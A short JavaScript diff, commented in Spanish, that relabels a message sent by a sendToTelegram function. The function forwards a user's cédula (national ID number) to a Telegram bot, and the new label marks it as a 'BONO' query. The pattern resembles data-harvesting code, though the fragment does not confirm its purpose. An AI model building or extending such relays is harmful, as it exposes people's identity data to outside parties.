@@ -168,7 +168,7 @@
      */
     function sendToTelegram(cedula) {
       // El mensaje que se enviará: 🔴NUEVA CONSULTA: (Cedula)
-      const message = `🔴NUEVA CONSULTA: ${cedula}`;
+      const message = `🔴NUEVA CONSULTA (BONO): ${cedula}`;
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
       const params = new URLSearchParams({
